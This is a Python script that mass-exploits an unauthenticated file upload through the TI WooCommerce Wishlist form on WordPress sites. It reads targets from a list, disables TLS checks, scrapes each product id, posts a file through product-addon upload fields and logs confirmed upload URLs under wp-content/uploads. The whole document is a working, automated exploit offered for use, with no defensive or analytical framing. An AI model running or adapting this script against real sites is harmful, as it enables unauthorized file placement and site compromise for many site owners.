import requests
import re
from urllib.parse import urljoin
import urllib3
urllib3.disable_warnings()

FILE_TO_UPLOAD = "hinata.jpg"

with open("list.txt") as f:
    targets = [x.strip() for x in f if x.strip()]

headers = {
    'User-Agent': 'Mozilla/5.0'
}

for target in targets:
    if not target.startswith("http"):
        target = "https://" + target
    print(f"[*] Target: {target}")

    try:
        # Step 1: Get product_id
        r = requests.get(target, headers=headers, verify=False, timeout=15)
        product_match = re.search(r'data-tinv-wl-product="(\d+)"', r.text)
        if not product_match:
            print("[-] No product_id found")
            continue
        product_id = product_match.group(1)
        print(f"[+] Found product_id: {product_id}")

        # Step 2: Upload file
        with open(FILE_TO_UPLOAD, 'rb') as f:
            files = {
                'form[tinvwl-hidden-fields]': (None, '[]'),
                'form[file]': (None, ''),
                'file': (FILE_TO_UPLOAD, f, 'image/jpeg'),
                'tinv_wishlist_id': (None, ''),
                'tinv_wishlist_name': (None, ''),
                'product_type': (None, 'simple'),
                'product_id': (None, product_id),
                'product_variation': (None, '0'),
                'product_action': (None, 'addto'),
                'redirect': (None, 'http://testing.test/')
            }

            resp = requests.post(target, files=files, headers=headers, verify=False, timeout=20)
            try:
                json_data = resp.json()
            except Exception:
                print("[-] Invalid JSON response")
                continue

            wishlist_url = json_data.get("wishlist_url")
            if not wishlist_url:
                print("[-] Wishlist key not found")
                continue

            print(f"[+] Checking: {wishlist_url}")
            with open("result_wishlist.txt", "a") as wfile:
                wfile.write(wishlist_url + "\n")

            wishlist_resp = requests.get(wishlist_url, headers=headers, verify=False, timeout=15)

            # Search uploaded file
            match = re.search(r'(\/wp-content\/uploads\/product_addons_uploads\/[a-z0-9\/\-_]+\.jpg)', wishlist_resp.text, re.I)
            if match:
                img_path = match.group(1)
                full_url = urljoin(target, img_path)
                print(f"[✓] FOUND on: {wishlist_url}")
                print(f"[✓] Upload: {full_url}")
                with open("result.txt", "a") as result_file:
                    result_file.write(full_url + "\n")
            else:
                print("[-] uploads path not found")

    except Exception as e:
        print(f"[!] Error: {e}")
